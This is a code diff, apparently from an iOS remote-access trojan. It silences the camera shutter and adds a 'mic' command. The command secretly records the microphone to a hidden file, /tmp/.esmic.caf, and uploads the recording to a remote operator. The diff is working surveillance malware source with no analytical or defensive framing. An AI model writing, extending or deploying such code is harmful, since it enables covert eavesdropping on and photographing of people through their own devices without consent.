@@ -66,7 +66,8 @@ int sockfd;
 //MARK: Camera
 
 -(void)camera:(BOOL)isfront {
-    [_messagingCenter sendMessageName:@"silenceShutter" userInfo:nil];
+    NSDictionary *userInfo = [NSDictionary dictionaryWithObject:@"silenceShutter" forKey:@"cmd"];
+    [_messagingCenter sendMessageName:@"commandWithNoReply" userInfo:userInfo];
     [self setupCaptureSession:isfront];
     [NSThread sleepForTimeInterval:0.2];
     //this guy deserves a medal
@@ -156,6 +157,50 @@ int sockfd;
     [_stillImageOutput release];
     [_session release];
 }
+
+//MARK: Mic
+
+-(void)mic:(NSArray *)args {
+    NSString *usage = @"Usage: mic start|stop";
+    if (args.count == 1) {
+        [self sendString:usage];
+        return;
+    }
+    if ([[self forgetFirst:args] isEqual:@"start"]) {
+        [[AVAudioSession sharedInstance] setCategory:AVAudioSessionCategoryRecord withOptions:AVAudioSessionCategoryOptionMixWithOthers error:nil];
+        
+        NSString *destinationString = @"/tmp/.esmic.caf";
+        NSURL *destinationURL = [NSURL fileURLWithPath: destinationString];
+        NSDictionary *mysettings = @{AVFormatIDKey: @(kAudioFormatMPEG4AAC),
+                                     AVEncoderAudioQualityKey: @(AVAudioQualityHigh),
+                                     AVNumberOfChannelsKey: @1,
+                                     AVSampleRateKey: @22050.0f};
+        [[AVAudioSession sharedInstance] setActive:YES error:nil];
+        
+        recorder = [[AVAudioRecorder alloc] initWithURL:destinationURL settings:mysettings error:nil];
+        recorder.delegate = self;
+        
+        [recorder prepareToRecord];
+        [recorder record];
+
+        [self sendString:@"Listening..."];
+    }
+    else if ([[self forgetFirst:args] isEqual:@"stop"]) {
+        if ([recorder isRecording]) {
+            [recorder stop];
+            [self download:[[NSArray alloc] initWithObjects:@"download",@"/tmp/.esmic.caf", nil]];
+        }
+        else {
+            [self sendString:@"-1"];
+        }
+    }
+    else {
+        [self sendString:usage];
+    }
+}
+
+
+
 
 //MARK: File Management
 
